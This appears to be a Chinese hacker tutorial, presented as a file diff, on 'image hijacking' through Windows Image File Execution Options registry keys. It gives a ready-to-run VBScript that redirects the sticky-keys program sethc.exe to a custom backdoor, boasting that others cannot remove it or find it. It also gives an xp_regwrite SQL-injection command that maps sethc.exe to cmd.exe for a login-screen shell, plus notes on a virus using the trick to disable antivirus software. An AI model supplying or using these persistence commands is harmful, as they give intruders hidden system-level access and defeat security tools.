@@ -1,0 +1,50 @@
+镜像劫持sethc.exe
+ 
+ 
+ 
+什么是镜像劫持(autorun.inf 和oobtwtr.exe手动去除法)2007-06-12 10:26镜像劫持
+
+大家都知道Shift后门对应的文件为：sethc.exe
+
+只要把sethc.exe挟持，别人就删不掉了。
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\debugger",WScript.CreateObject("WScript.shell").ExpandEnvironmentStrings("%SystemRoot%")&"\system32\obc32.exe","REG_SZ" 
+ 
+ 
+把上面代码保存为 *.vbs, 然后运行vbs就可以了
+
+用来挟持shift的，让别人替换不了你的后门
+
+这里注意了，shift后门文件名可以随便写，我这里是obc32.exe
+
+这样在电脑里也搜索不到sethc.exe,哈哈
+
+但必须跟代码里的文件名对应上，system32目录下的 
+ 
+
+
+    在针对杀毒软件方面，OSO病毒还采用了一种新技术，这种技术被成为镜像劫持，通过这种技术也能够将杀毒软件置于死地。
+
+
+   所谓的镜像劫持，就是在注册表的[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\ CurrentVersion\Image File Execution Options]处新建一个以杀毒软件主程序命名的项，例如Rav.exe。然后再创建一个子键“Debugger="C:\\WINDOWS\\system32\\drivers\\ceffen.com”。以后只要用户双击 Rav.exe就会运行OSO的病毒文件ceffen.com，类似文件关联的效果。by deyu260   QQ272873373
+
+
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','REG_sz','c:\windows\system32\cmd.exe on';-- 镜像劫持
+
+
+----------
+ 
+ 
+ 先来劫持下  大家记住这个路径哦· ·呵呵 算是路径吧
+
+SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Optio
+ 
+
+
+
+呵呵  我就不打咯· 
+
+新建一个项  命名sethc.exe 接着在里面新建一个字符串值为debugger的
+
+呵呵 这个是我弄的一个算是shift后门吧 随便放个地方 双击这个把路径填进
